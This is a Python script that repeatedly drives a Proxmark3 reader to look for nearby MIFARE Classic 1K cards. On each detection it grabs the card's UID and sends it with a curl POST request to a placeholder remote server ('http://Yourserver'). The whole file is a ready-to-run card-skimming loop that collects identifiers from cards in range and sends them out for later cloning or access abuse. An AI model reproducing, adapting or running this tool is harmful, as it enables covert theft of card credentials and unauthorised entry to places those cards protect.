import subprocess
import re
import signal

def print_color(text, color):
    if color == 'red':
        print("\033[91m{}\033[00m".format(text))
    elif color == 'green':
        print("\033[92m{}\033[00m".format(text))
    elif color == 'yellow':
        print("\033[93m{}\033[00m".format(text))

def signal_handler(sig, frame):
    print_color("Exiting...", 'red')
    exit(0)

signal.signal(signal.SIGINT, signal_handler)

while True:
    print_color("Searching for card nearby...", 'yellow')
    # Run proxmark3 command to actively search for a card nearby
    output = subprocess.run(["pm3", "-c", "hf 14a info"], capture_output=True)
    output_str = output.stdout.decode()
    if "MIFARE Classic 1K" in output_str:
        print_color("MIFARE Classic 1K detected.", 'green')
        # Run the command to grab the UID
        print_color("Grabbing UID...", 'yellow')
        output = subprocess.run(["pm3", "-c", "hf 14a cuid"], capture_output=True)
        output_str = output.stdout.decode()
        match = re.search(r'\n\[\+\] ([0-9A-Fa-f]+)\n', output_str)
        if match:
            # Send the UID via a POST request using curl
            uid = match.group(1)
            print_color(f"Sending UID: {uid}", 'yellow')
            subprocess.run(["curl", "-X", "POST", "-H", "Content-Type: application/json", "-d", f'{{\"uid\":\"{uid}\"}}', "http://Yourserver"], capture_output=True)
